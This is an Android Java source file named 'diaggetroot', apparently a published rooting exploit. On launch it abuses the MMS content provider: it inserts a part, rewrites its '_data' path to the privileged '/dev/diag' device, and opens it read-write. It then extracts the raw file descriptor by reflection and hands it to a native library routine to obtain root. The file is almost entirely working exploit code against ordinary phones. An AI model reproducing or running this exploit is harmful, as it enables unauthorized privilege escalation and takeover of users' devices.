/*
 * Copyright (c) 2013 Hiroyuki Ikezoe
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR(S) ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR(S) BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
/*
 * Based on htcj_butterflay_diaggetroot.zip
 * <https://docs.google.com/file/d/0B8LDObFOpzZqQzducmxjRExXNnM/edit?pli=1>
 */
package com.example.diaggetroot;

import java.io.FileDescriptor;
import java.lang.reflect.Field;
import android.net.Uri;
import android.os.Bundle;
import android.os.ParcelFileDescriptor;
import android.app.Activity;
import android.content.ContentValues;
import android.util.Log;

public class MainActivity extends Activity {
  final static String TAG = "##DiagGetroot##";
  static {
    System.loadLibrary("diaggetrootjni");
  }
  native void getrootnative(int fd);

  private void useMMS() {
    Uri uri = Uri.parse("content://mms/0/part");
    try {
      ContentValues values2 = new ContentValues();
      Uri uri2 = getContentResolver().insert(uri, values2);
      if (uri2 != null)
        Log.d(TAG, "" + uri2);
      ContentValues values = new ContentValues();
      values.put("_data", "/dev/diag");
      getContentResolver().update(uri2, values, null, null);
      ParcelFileDescriptor pfd = getContentResolver().openFileDescriptor(uri2, "rw");
      Log.d(TAG, "Pfd=" + pfd);
      pfd.getFileDescriptor();
      FileDescriptor fd = pfd.getFileDescriptor();
      Field fld = fd.getClass().getDeclaredField("descriptor");
      fld.setAccessible(true);
      int fint;
      fint = fld.getInt(fd);
      Log.d(TAG, "fint=" + fint);
      getrootnative(fint);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  @Override
  public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);
    useMMS();
  }
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
